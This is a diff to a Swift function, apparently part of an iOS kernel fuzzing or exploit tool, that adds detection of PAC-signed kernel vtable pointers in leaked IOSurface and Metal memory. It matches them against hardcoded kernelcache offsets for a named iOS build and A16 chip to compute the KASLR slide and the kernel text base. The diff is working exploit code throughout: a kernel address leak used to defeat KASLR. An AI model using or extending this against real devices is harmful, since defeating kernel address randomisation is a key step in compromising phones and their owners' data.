@@ -1890,18 +1890,49 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                                   &outBytes)
             }
             guard kr == 0 else { step("  \(label): vm_read kr=\(kr)"); return }
-            var found = 0, ktext = 0, kheap = 0, kmmio = 0, kgap = 0
+            // PAC-KTEXT: arm64e vtable entries are PAC-signed — top 16 bits = PAC tag, lower 48 bits = slid target VA.
+            // iOS 26.5.2 A16 unslid __TEXT base = 0xfffffff007004000 → lo48 = 0x0000fff007004000
+            // With max KASLR slide 0x80000000, max-slid __TEXT_EXEC end lo48 = 0x0000fff08a744000
+            // Known IOSurface vtable function lower-32 offsets from __TEXT base (from kernelcache analysis)
+            let pacTextLo: UInt64 = 0x0000fff007004000
+            let pacTextHi: UInt64 = 0x0000fff08a744000
+            let iosurfAnchors: [UInt64] = [
+                0x0299ac80, 0x0299ad20, 0x03573708, 0x035736fc, 0x035736cc,
+                0x0357369c, 0x03573514, 0x0299ad7c, 0x035703f4, 0x03573484,
+                0x03573454, 0x035732fc, 0x035c7f6c, 0x035732f0, 0x0299b3e4,
+            ]
+            var found = 0, ktext = 0, kheap = 0, kmmio = 0, kgap = 0, kpac = 0
             for qw in 0..<(Int(outBytes) / 8) {
                 var val: UInt64 = 0
                 for b in 0..<8 { val |= UInt64(buf[qw*8 + b]) << (b*8) }
-                guard val >= 0xFFFFFE0000000000 && val != 0xFFFFFFFFFFFFFFFF else { continue }
+                // PAC-signed vtable pointer check: lower 48 bits land in slid KTEXT range
+                let vLo48 = val & 0x0000FFFFFFFFFFFF
+                let isPac = val < 0xFFFFFE0000000000 && vLo48 >= pacTextLo && vLo48 <= pacTextHi
+                guard val >= 0xFFFFFE0000000000 || isPac else { continue }
+                guard val != 0xFFFFFFFFFFFFFFFF else { continue }
                 let b0 = UInt8(val & 0xFF)
                 guard val != UInt64(b0) &* 0x0101010101010101 else { continue }
                 guard (val & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
                 let unslidBase: UInt64 = 0xFFFFFFF007004000
                 let slide = val &- unslidBase
                 let cat: String
-                if val >= 0xFFFFFFF000000000 && val < 0xFFFFFFF080000000 && (val & 3) == 0 && slide <= 0x80000000 {
+                if isPac {
+                    let sOff = vLo48 &- pacTextLo  // = lower_32_vtable_offset + KASLR_slide
+                    var slideNote = ""
+                    for anc in iosurfAnchors {
+                        if sOff >= anc {
+                            let s = sOff &- anc
+                            if s % 0x4000 == 0 && s <= 0x80000000 {
+                                slideNote = " *** KASLR slide=0x\(String(s,radix:16)) __TEXT=0x\(String(0xfffffff007004000 &+ s,radix:16))"
+                                break
+                            }
+                        }
+                    }
+                    step("  \(label)[+0x\(String(qw*8,radix:16))] = 0x\(String(val,radix:16)) [PAC-KTEXT lo48=0x\(String(vLo48,radix:16)) sOff=0x\(String(sOff,radix:16))]\(slideNote)")
+                    kpac += 1; found += 1
+                    if found >= 120 { step("  ...clipped at 120"); break }
+                    continue
+                } else if val >= 0xFFFFFFF000000000 && val < 0xFFFFFFF080000000 && (val & 3) == 0 && slide <= 0x80000000 {
                     cat = "KTEXT"; ktext += 1
                 } else if val >= 0xFFFFFFF080000000 {
                     cat = "KMMIO"; kmmio += 1
@@ -1914,7 +1945,7 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                 found += 1
                 if found >= 120 { step("  ...clipped at 120"); break }
             }
-            step("  \(label) total: KTEXT=\(ktext) KHEAP=\(kheap) KGAP=\(kgap) KMMIO=\(kmmio)")
+            step("  \(label) total: KTEXT=\(ktext) KHEAP=\(kheap) KGAP=\(kgap) KMMIO=\(kmmio) PAC=\(kpac)")
         }
 
         // Scan 0: Metal device/queue ObjC objects — guaranteed Metal driver state, no zone hunting.
@@ -1989,9 +2020,26 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
             for qw in 0..<(Int(prtOut)/8) {
                 var v: UInt64 = 0
                 for b in 0..<8 { v |= UInt64(prtChunkBuf[qw*8+b]) << (b*8) }
-                guard v >= 0xFFFFFE0000000000 && v != 0xFFFFFFFFFFFFFFFF else { continue }
+                let vLo48p = v & 0x0000FFFFFFFFFFFF
+                let isPacp = v < 0xFFFFFE0000000000 && vLo48p >= 0x0000fff007004000 && vLo48p <= 0x0000fff08a744000
+                guard v >= 0xFFFFFE0000000000 || isPacp else { continue }
+                guard v != 0xFFFFFFFFFFFFFFFF else { continue }
                 let b0 = UInt8(v & 0xFF); guard v != UInt64(b0) &* 0x0101010101010101 else { continue }
                 guard (v & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
+                let globalOff = chunkByteOffset + qw*8
+                if isPacp {
+                    let sOff = vLo48p &- 0x0000fff007004000
+                    var slideNote = ""
+                    let anchors2: [UInt64] = [0x0299ac80,0x0299ad20,0x03573708,0x035736fc,0x035736cc,
+                                              0x0357369c,0x03573514,0x0299ad7c,0x035703f4,0x03573484,
+                                              0x03573454,0x035732fc,0x035c7f6c,0x035732f0,0x0299b3e4]
+                    for anc in anchors2 {
+                        if sOff >= anc { let s = sOff &- anc; if s % 0x4000 == 0 && s <= 0x80000000 { slideNote = " *** KASLR slide=0x\(String(s,radix:16)) __TEXT=0x\(String(0xfffffff007004000 &+ s,radix:16))"; break } }
+                    }
+                    step("  prt[+0x\(String(globalOff,radix:16))]=0x\(String(v,radix:16)) [PAC-KTEXT sOff=0x\(String(sOff,radix:16))]\(slideNote)")
+                    seenThisRun.insert(v)
+                    continue
+                }
                 let cat: String
                 if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 {
                     cat = (v & 3) == 0 ? "KTEXT" : "KTEXTD"
@@ -1999,7 +2047,6 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                 else if v >= 0xFFFFFFF080000000                        { cat = "KMMIO" }
                 else if v >= 0xFFFFFE0000000000 && v <= 0xFFFFFEFFFFFFFFFF { cat = "KHEAP" }
                 else                                                    { cat = "KGAP"  }
-                let globalOff = chunkByteOffset + qw*8
                 step("  prt[+0x\(String(globalOff,radix:16))]=0x\(String(v,radix:16)) [\(cat)]")
                 // Only track KHEAP and KTEXT offsets — KMMIO values are Metal GPU ring-buffer
                 // addresses that change between boots by page-aligned amounts, producing false
@@ -2021,8 +2068,11 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
             if !recurring.isEmpty {
                 step("RECURRING (\(_iosurfRunCount) runs total):")
                 for (v, cnt) in recurring.prefix(20) {
+                    let vLo48r = v & 0x0000FFFFFFFFFFFF
+                    let isPacr = v < 0xFFFFFE0000000000 && vLo48r >= 0x0000fff007004000 && vLo48r <= 0x0000fff08a744000
                     let cat: String
-                    if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 {
+                    if isPacr                                              { cat = "PAC-KTEXT" }
+                    else if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 {
                         cat = (v & 3) == 0 ? "KTEXT" : "KTEXTD"
                     }
                     else if v >= 0xFFFFFFF080000000                        { cat = "KMMIO" }
@@ -2030,7 +2080,16 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                     else                                                    { cat = "KGAP"  }
                     let unslidBase: UInt64 = 0xFFFFFFF007004000
                     var extra = ""
-                    if cat == "KTEXT" {  // only 4-byte aligned = real code ptr
+                    if isPacr {
+                        let sOff = vLo48r &- 0x0000fff007004000
+                        let anchors3: [UInt64] = [0x0299ac80,0x0299ad20,0x03573708,0x035736fc,0x035736cc,
+                                                  0x0357369c,0x03573514,0x0299ad7c,0x035703f4,0x03573484,
+                                                  0x03573454,0x035732fc,0x035c7f6c,0x035732f0,0x0299b3e4]
+                        for anc in anchors3 {
+                            if sOff >= anc { let s = sOff &- anc; if s % 0x4000 == 0 && s <= 0x80000000 { extra = " *** KASLR slide=0x\(String(s,radix:16)) __TEXT=0x\(String(unslidBase &+ s,radix:16))"; break } }
+                        }
+                        if extra.isEmpty { extra = " sOff=0x\(String(sOff,radix:16))" }
+                    } else if cat == "KTEXT" {
                         let slide = v &- unslidBase
                         if slide <= 0x80000000 { extra = " *** KASLR slide=0x\(String(slide,radix:16))" }
                     } else if cat == "KTEXTD" {
@@ -2047,8 +2106,11 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
             if !novelVals.isEmpty {
                 step("NOVEL THIS RUN (\(novelVals.count) first-time values — transient heap residue):")
                 for v in novelVals {
+                    let vLo48n = v & 0x0000FFFFFFFFFFFF
+                    let isPacn = v < 0xFFFFFE0000000000 && vLo48n >= 0x0000fff007004000 && vLo48n <= 0x0000fff08a744000
                     let cat2: String
-                    if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 {
+                    if isPacn                                              { cat2 = "PAC-KTEXT" }
+                    else if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 {
                         cat2 = (v & 3) == 0 ? "KTEXT" : "KTEXTD"
                     } else if v >= 0xFFFFFFF080000000 {
                         cat2 = "KMMIO"
@@ -2059,7 +2121,16 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                     }
                     let unslidBase2: UInt64 = 0xFFFFFFF007004000
                     var extra2 = ""
-                    if cat2 == "KTEXT" {
+                    if isPacn {
+                        let sOff2 = vLo48n &- 0x0000fff007004000
+                        let anchors4: [UInt64] = [0x0299ac80,0x0299ad20,0x03573708,0x035736fc,0x035736cc,
+                                                  0x0357369c,0x03573514,0x0299ad7c,0x035703f4,0x03573484,
+                                                  0x03573454,0x035732fc,0x035c7f6c,0x035732f0,0x0299b3e4]
+                        for anc in anchors4 {
+                            if sOff2 >= anc { let s = sOff2 &- anc; if s % 0x4000 == 0 && s <= 0x80000000 { extra2 = " *** KASLR slide=0x\(String(s,radix:16)) __TEXT=0x\(String(unslidBase2 &+ s,radix:16))"; break } }
+                        }
+                        if extra2.isEmpty { extra2 = " sOff=0x\(String(sOff2,radix:16))" }
+                    } else if cat2 == "KTEXT" {
                         let slide2 = v &- unslidBase2
                         if slide2 <= 0x80000000 { extra2 = " *** KASLR slide=0x\(String(slide2,radix:16))" }
                     }
